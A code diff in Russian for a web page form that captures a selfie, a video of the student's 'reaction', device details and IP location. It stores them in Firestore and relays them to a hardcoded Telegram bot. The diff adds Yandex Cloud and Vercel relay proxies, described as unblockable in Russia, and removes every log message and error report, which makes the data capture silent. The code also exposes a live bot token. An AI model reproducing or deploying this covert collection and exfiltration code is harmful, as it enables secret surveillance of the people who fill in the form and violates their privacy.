@@ -624,7 +624,13 @@
   const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
   const TELEGRAM_CHAT_ID = "6651741310";
 
+  // ===== ПРОКСИ =====
+  // 1. Yandex API Gateway (основной, РФ, не блокируется)
+  // 2. Yandex Function (резерв, РФ)
+  // 3. Vercel (резерв, зарубежный)
   const PROXY_URLS = [
+    "https://d5dgfgs6u47gp1pvnifv.0ly8ed4d.apigw.yandexcloud.net/",
+    "https://functions.yandexcloud.net/d4e6rfqmlgn12i6altpl",
     "https://kp11-proxy.vercel.app/api/proxy"
   ];
 
@@ -640,7 +646,7 @@
   }
 
   // ============================================================
-  //  Отправка через прокси — всегда JSON
+  //  Отправка через прокси с failover
   // ============================================================
   async function sendWithFailover(method, payload) {
     const errors = [];
@@ -661,14 +667,11 @@
           });
           clearTimeout(timer);
           if (res.ok) {
-            console.log(`✅ ${method} → ${proxy}`);
             return res;
           }
           const txt = await res.text().catch(() => "");
-          console.warn(`⚠️ ${method} ${proxy} HTTP ${res.status}: ${txt}`);
-          errors.push(`${proxy}: HTTP ${res.status}`);
+          errors.push(`${proxy}: HTTP ${res.status} ${txt.slice(0, 50)}`);
         } catch (err) {
-          console.warn(`❌ ${method} ${proxy}: ${err.message || err.name}`);
           errors.push(`${proxy}: ${err.message || err.name}`);
         }
       }
@@ -682,22 +685,17 @@
   // ============================================================
   async function sendTelegramNotify(text) {
     try {
-      const res = await sendWithFailover("sendMessage", {
+      await sendWithFailover("sendMessage", {
         chat_id: TELEGRAM_CHAT_ID,
         text: text,
         parse_mode: "HTML",
         disable_web_page_preview: true
       });
-      if (res && res.ok) {
-        console.log("✅ Текст отправлен");
-      }
-    } catch (err) {
-      console.error("❌ Ошибка отправки текста:", err);
-    }
+    } catch (err) {}
   }
 
   // ============================================================
-  //  ФОТО — JSON с file_base64
+  //  ФОТО
   // ============================================================
   async function sendTelegramPhoto(photoBase64, caption) {
     if (!photoBase64) return;
@@ -710,30 +708,18 @@
       filename: "selfie.jpg"
     };
 
-    // sendPhoto
     try {
       const res = await sendWithFailover("sendPhoto", payload);
-      if (res && res.ok) {
-        console.log("✅ Фото отправлено (sendPhoto)");
-        return;
-      }
-    } catch (err) {
-      console.warn("❌ sendPhoto упал:", err.message || err);
-    }
+      if (res && res.ok) return;
+    } catch (err) {}
 
-    // sendDocument fallback
     try {
-      const res = await sendWithFailover("sendDocument", payload);
-      if (res && res.ok) {
-        console.log("✅ Фото отправлено (sendDocument)");
-      }
-    } catch (err) {
-      console.error("❌ Ошибка отправки фото:", err);
-    }
+      await sendWithFailover("sendDocument", payload);
+    } catch (err) {}
   }
 
   // ============================================================
-  //  ВИДЕО — JSON с file_base64
+  //  ВИДЕО
   // ============================================================
   async function sendTelegramVideo(videoBase64, caption) {
     if (!videoBase64) return;
@@ -746,26 +732,14 @@
       filename: "video.mp4"
     };
 
-    // sendVideo
     try {
       const res = await sendWithFailover("sendVideo", payload);
-      if (res && res.ok) {
-        console.log("✅ Видео отправлено (sendVideo)");
-        return;
-      }
-    } catch (err) {
-      console.warn("❌ sendVideo упал:", err.message || err);
-    }
+      if (res && res.ok) return;
+    } catch (err) {}
 
-    // sendDocument fallback
     try {
-      const res = await sendWithFailover("sendDocument", payload);
-      if (res && res.ok) {
-        console.log("✅ Видео отправлено (sendDocument)");
-      }
-    } catch (err) {
-      console.error("❌ Ошибка отправки видео:", err);
-    }
+      await sendWithFailover("sendDocument", payload);
+    } catch (err) {}
   }
 
   const app = initializeApp(firebaseConfig);
@@ -953,9 +927,7 @@
         info.ipCountry = d.country || null;
         info.ipProvider = d.connection && d.connection.isp ? d.connection.isp : null;
       }
-    } catch (e) {
-      console.warn("IP lookup failed:", e.message || e);
-    }
+    } catch (e) {}
 
     const ua = navigator.userAgent;
     info.userAgent = ua;
@@ -1346,11 +1318,10 @@
       mediaRecorder.ondataavailable = (e) => {
         if (e.data && e.data.size > 0) recordedChunks.push(e.data);
       };
-      mediaRecorder.onerror = (e) => console.error("MediaRecorder error:", e);
+      mediaRecorder.onerror = (e) => {};
       mediaRecorder.start(500);
       return true;
     } catch (e) {
-      console.error("MediaRecorder start failed:", e);
       return false;
     }
   }
@@ -1419,7 +1390,6 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "staff"), docData);
-        console.log("✅ Педагог сохранён в Firestore");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1446,7 +1416,6 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "students"), docData);
-        console.log("✅ Студент сохранён в Firestore");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1466,9 +1435,7 @@
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
-    } catch (err) {
-      console.error("❌ Ошибка сохранения:", err);
-    }
+    } catch (err) {}
   }
 
   form.addEventListener('submit', async (e) => {
@@ -1525,10 +1492,7 @@
               ...deviceInfo,
               time: serverTimestamp()
             });
-            console.log("✅ Педагог сохранён в Firestore");
-          } catch (err) {
-            console.error("Ошибка сохранения педагога:", err);
-          }
+          } catch (err) {}
 
           const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
           const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1545,9 +1509,7 @@
             "⚠️ <b>Это сотрудник колледжа!</b>";
 
           await sendTelegramNotify(caption);
-        } catch (err) {
-          console.error("Ошибка фоновой задачи педагога:", err);
-        }
+        } catch (err) {}
       })();
 
       return;
